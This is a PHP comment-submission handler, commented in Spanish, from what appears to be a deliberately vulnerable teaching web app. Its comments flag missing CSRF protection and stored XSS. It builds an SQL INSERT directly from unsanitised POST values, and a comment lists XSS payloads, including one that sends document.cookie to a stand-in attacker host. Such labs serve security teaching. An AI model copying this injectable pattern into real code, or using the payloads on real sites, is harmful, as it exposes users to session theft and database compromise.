<?php
/**
 * =====================================================
 * AGREGAR COMENTARIO
 * =====================================================
 * 
 * Procesa el envío de un nuevo comentario.
 * 
 * VULNERABILIDADES:
 * 1. Sin protección CSRF
 * 2. XSS Almacenado - el comentario se guarda sin sanitizar
 * 3. SQL Injection potencial
 * 
 * =====================================================
 */

require_once '../config/config.php';

if (!isLoggedIn()) {
    header("Location: ../auth/login.php");
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $tema_id = $_POST['tema_id'] ?? '';
    $contenido = $_POST['contenido'] ?? '';
    
    if (empty($tema_id) || empty($contenido)) {
        header("Location: ../index.php");
        exit;
    }
    
    $conn = getConnection();
    $usuario_id = $_SESSION['user_id'];
    
    /**
     * =====================================================
     * VULNERABILIDAD: XSS ALMACENADO
     * =====================================================
     * El contenido se guarda directamente en la base de datos
     * SIN sanitizar. Cuando se muestre en topics/view.php,
     * el código malicioso se ejecutará.
     * 
     * PAYLOADS DE PRUEBA:
     * <script>alert('XSS Almacenado!');</script>
     * <img src=x onerror='alert(document.cookie)'>
     * <svg onload="document.location='http://atacante.com?c='+document.cookie">
     * 
     * DEMOSTRACIÓN EDUCATIVA
     * =====================================================
     */
    $sql = "INSERT INTO comentarios (tema_id, usuario_id, contenido) 
            VALUES ($tema_id, $usuario_id, '$contenido')";
    
    if ($conn->query($sql) === TRUE) {
        header("Location: ../topics/view.php?id=" . $tema_id);
    } else {
        echo "Error al agregar comentario: " . $conn->error;
    }
    
    $conn->close();
} else {
    header("Location: ../index.php");
}
?>
